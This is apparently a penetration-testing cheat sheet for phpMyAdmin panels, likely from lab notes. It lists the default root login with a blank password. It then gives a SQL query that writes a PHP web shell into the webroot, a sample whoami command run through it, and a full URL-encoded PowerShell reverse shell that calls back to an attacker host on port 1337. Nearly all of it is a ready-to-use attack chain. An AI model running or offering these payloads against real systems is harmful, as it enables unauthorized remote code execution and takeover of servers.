# PhpMyAdmin Service

an SQL Database Panel

Default Credentials

```
root: (blank password)
```

---

When having access to an PhpMyAdmin SQL Database Panel, an user can create an database and prompt the following query inside an SQL Prompt under the database in order to gain an webshell:

1) Create Database "hacker" > Navigate to SQL Input Section

## Windows PoC

2) Prompt the following input and outfile it into webroot of xampserver.

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\shell.php"
```

3) We should have an webshell on the following url now: 

```
http://192.168.187.189:8080/shell.php?cmd=whoami
nt authority\local service 
```

4) Gained RCE through reverse shell scripts, embedded or uploaded onto the target system.

```
http://192.168.187.189:8080/shell.php?cmd=powershell%20-nop%20-W%20hidden%20-noni%20-ep%20bypass%20-c%20%22%24TCPClient%20%3D%20New-Object%20Net.Sockets.TCPClient(%27192.168.45.163%27%2C%201337)%3B%24NetworkStream%20%3D%20%24TCPClient.GetStream()%3B%24StreamWriter%20%3D%20New-Object%20IO.StreamWriter(%24NetworkStream)%3Bfunction%20WriteToStream%20(%24String)%20{[byte[]]%24script%3ABuffer%20%3D%200..%24TCPClient.ReceiveBufferSize%20|%20%25%20{0}%3B%24StreamWriter.Write(%24String%20%2B%20%27SHELL%3E%20%27)%3B%24StreamWriter.Flush()}WriteToStream%20%27%27%3Bwhile((%24BytesRead%20%3D%20%24NetworkStream.Read(%24Buffer%2C%200%2C%20%24Buffer.Length))%20-gt%200)%20{%24Command%20%3D%20([text.encoding]%3A%3AUTF8).GetString(%24Buffer%2C%200%2C%20%24BytesRead%20-%201)%3B%24Output%20%3D%20try%20{Invoke-Expression%20%24Command%202%3E%261%20|%20Out-String}%20catch%20{%24_%20|%20Out-String}WriteToStream%20(%24Output)}%24StreamWriter.Close()%22
```
